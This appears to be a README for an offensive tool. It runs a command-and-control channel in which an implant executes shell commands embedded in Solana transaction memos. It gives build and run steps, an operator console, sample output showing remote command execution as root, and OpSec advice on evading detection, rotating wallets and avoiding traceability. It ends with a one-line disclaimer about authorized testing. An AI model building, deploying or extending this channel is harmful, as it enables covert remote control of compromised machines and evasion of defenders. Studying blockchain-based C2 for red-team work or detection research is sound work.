# 🕶️ C2 Blockchain Memo

**Command & Control via Solana Transaction Memo Fields**

No C2 server. No proxy. No domain. Just the blockchain.

Commands are embedded in Solana transaction memos using the [Memo Program](https://spl.solana.com/memo).
Every transaction is public on-chain — **undetectable as C2 traffic**. Blocking it would
require blocking all Solana RPC traffic, which would break the entire Solana ecosystem.

```
┌──────────┐    Solana Transaction     ┌──────────┐
│ Operator ├──── (transfer + memo) ────→│ Implant  │
│ (server) │    1 lamport + command    │ (client) │
└──────────┘                           └────┬─────┘
                                            │
                                     Executes command
                                     via os.exec()
```

---

## How It Works

### The Chain as C2 Channel

1. **Operator** sends a standard Solana transaction containing:
   - A **1-lamport SOL transfer** to the implant's wallet (creates an on-chain link)
   - A **Memo Program instruction** with the shell command as memo text

2. **Implant** polls the Solana RPC endpoint for `getSignaturesForAddress` on its own
   wallet address, extracts the memo text from each incoming transaction, and executes
   it as a shell command.

3. **No infrastructure.** The "server" is just building transactions. The "network" is
   the Solana blockchain. There's no IP address, no domain, no certificate, no proxy to
   block.

### Cost

- **Devnet/Testnet:** Free (faucet SOL, no real money)
- **Mainnet:** ~0.000005 SOL per command (~$0.001 at current prices)

---

## Build

```bash
# Clone or cd into the project
cd c2-suite/c2-blockchain-memo

# Build both binaries
go build -o bin/server ./cmd/server
go build -o bin/client ./cmd/client

# Binaries are in ./bin/
```

### Dependencies

- Go 1.24+
- `github.com/gagliardetto/solana-go` (Solana Go SDK)

Everything is handled by `go mod tidy`. No manual dependency management needed.

---

## Quick Start (Devnet, Free)

### 1. Set up wallets

See **[SETUP_WALLET.md](./SETUP_WALLET.md)** for detailed instructions. The TL;DR:

```bash
# Install Solana CLI
sh -c "$(curl -sSfL https://release.anza.xyz/stable)"

# Generate operator wallet
solana-keygen new --outfile operator.json

# Generate implant wallet
solana-keygen new --outfile implant.json

# Get free devnet SOL
solana config set --url devnet
solana airdrop 2
```

### 2. Start the implant

```bash
./bin/client --keypair implant.json --rpc devnet --interval 15
```

You'll see:
```
🔭 Watching address: 7q6MgewGQzr3JwjJ8m7TzLfhTQAQScoXCaxzeNy9btRz
🔗 RPC endpoint:     https://api.devnet.solana.com
⏱  Poll interval:    15s (with ±50% jitter)

━━━ C2 Blockchain Memo — Implant ─━━
Listening for commands... Press Ctrl+C to stop.
```

### 3. Send a command (in another terminal)

```bash
./bin/server --keypair operator.json --rpc devnet
```

Then in the interactive shell:
```
› send <IMPLANT_ADDRESS> whoami
   Command sent!
   Signature: 5KtPn...xyz
   Explorer:  https://solscan.io/tx/5KtPn...xyz?cluster=devnet
   Command:   "whoami"
   Implant:   7q6MgewGQzr3JwjJ8m7TzLfhTQAQScoXCaxzeNy9btRz
```

The implant will receive the command within the next poll cycle:
```
   New command from tx 5KtPn...xyz:
   Command: whoami
   Output:
root
```

---

## Usage Reference

### Server (Operator)

```
./bin/server [flags]

Flags:
  --keypair string    Path to operator keypair (Solana CLI JSON array or base58)
  --rpc string        RPC endpoint: mainnet-beta, devnet, testnet, or custom URL
                      (default: "devnet")
```

**Interactive commands:**

| Command | Description |
|---------|-------------|
| `send <ADDRESS> <cmd>` | Send a shell command to an implant |
| `balance` | Check operator wallet SOL balance |
| `quit` | Exit |

### Client (Implant)

```
./bin/client [flags]

Flags:
  --address string    Wallet address to watch (alternative to --keypair)
  --keypair string    Path to implant keypair (uses its public key as watch address)
  --rpc string        RPC endpoint (default: "devnet")
  --interval int      Polling interval in seconds (default: 15)
  --limit int         Max transactions to fetch per poll (default: 10)
```

**You must provide either `--address` or `--keypair`.**

The implant:
1. Polls the RPC endpoint for incoming transactions to its address
2. Extracts memo text from each transaction (using the `memo` field in
   `getSignaturesForAddress` — built into Solana runtime)
3. Executes the memo text as a shell command
4. Tracks seen signatures to avoid re-execution

---

## Architecture Details

### How the Memo Field Works

Solana's Memo Program (`MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr`) allows any
transaction to include an arbitrary text message. The memo is:

- **Public** — anyone can read it on-chain
- **Permanent** — lives in the ledger forever
- **Cheap** — costs the same as any other instruction
- **Unblockable** — can't distinguish from legitimate Memo Program usage

### Transaction Structure

Each command transaction contains two instructions:

1. **System Program: Transfer** — sends 1 lamport from operator → implant
   - Creates a detectable on-chain link to the implant's address
   - The implant's `getSignaturesForAddress` picks this up
   - 1 lamport is the smallest unit (0.000000001 SOL)

2. **Memo Program: Memo** — contains the command text
   - The Solana runtime automatically includes the memo text in
     `getSignaturesForAddress` response (`memo` field)
   - No need to fetch the full transaction to read the command

### Why This is Undetectable as C2

- **No C2 infrastructure** — no domains, IPs, certificates, or hosting to discover
- **Blends with normal traffic** — millions of Solana transactions include memos daily
  (DeFi notes, NFT metadata, DEX tags)
- **No pattern to detect** — polling an RPC endpoint looks like any other dApp or wallet
- **Cannot block without collateral damage** — blocking `api.mainnet-beta.solana.com`
  would break the entire Solana ecosystem

### OpSec Notes

- **Memo is public plaintext.** Anyone can read commands on-chain via Solscan or any
  block explorer. For sensitive commands, encrypt the memo payload (e.g., XOR with a
  pre-shared key, or use a proper AEAD cipher). The implant would decrypt before executing.

- **Wallet fingerprinting.** An operator who always uses the same wallet creates a
  detectable signature pattern. For operational security, use ephemeral operator wallets
  funded from a central wallet.

- **Polling frequency.** Default 15s with jitter balances responsiveness and stealth.
  Sub-second polling to a single RPC is detectable. Use multiple RPC endpoints for
  higher-frequency polling.

- **Transaction volume.** If you send 10,000 commands from one wallet, that's a pattern.
  Rotate operator wallets.

---

## Comparison: Solana vs Ethereum for Blockchain C2

| Feature | Solana (this project) | Ethereum |
|---------|----------------------|----------|
| Tx cost | ~$0.001 | ~$1–$50 (gas) |
| Speed | ~400ms finality | ~12s block time |
| Memo built-in | Yes (Memo Program) | No (requires contract) |
| RPC rate limits | More permissive | Tighter |
| Faucet availability | Easy (devnet) | Easy (testnet) |
| Go SDK quality | Mature (solana-go) | Mature (go-ethereum) |
| Stealth | High (natural memo usage) | High (calldata) |

**Solana wins on cost and speed.** Ethereum contract storage costs are prohibitive
for a C2 channel. Solana transactions cost fractions of a cent.

---

## Encryption Example (AES-GCM)

For production use, encrypt commands before sending:

**Server-side (before sending):**
```go
// Pseudocode — use a proper key management scheme
plaintext := []byte(command)
ciphertext, _ := aesgcm.Seal(nil, nonce, plaintext, nil)
// Send base64(ciphertext + nonce) as the memo
```

**Client-side (after receiving):**
```go
ciphertext := base64.StdEncoding.DecodeString(memo)
plaintext, _ := aesgcm.Open(nil, ciphertext[:12], ciphertext[12:], nil)
executeCommand(string(plaintext))
```

The Solana chain is public. **Encrypt everything in production.**

---

## FAQ

**Q: Do I need crypto knowledge?**
A: No. Follow [SETUP_WALLET.md](./SETUP_WALLET.md). Devnet is free.

**Q: Can this be traced back to me?**
A: Your operator wallet on-chain activity is public. Use ephemeral wallets.

**Q: What if the RPC endpoint goes down?**
A: Use multiple RPC endpoints (QuickNode, Helius, public RPC pool). The implant
supports custom `--rpc` URLs.

**Q: Can I run this on mainnet with real SOL?**
A: Yes. Cost is ~$0.001 per command. But don't use it for illegal purposes.

**Q: How fast can commands be delivered?**
A: Solana confirms in ~400ms. Polling adds latency: default 15s with jitter. For faster
delivery, use --interval 2 (2s) with multiple RPC endpoints.

---

## DISCLAIMER

For authorized Security Testing or Educational Purposes only.
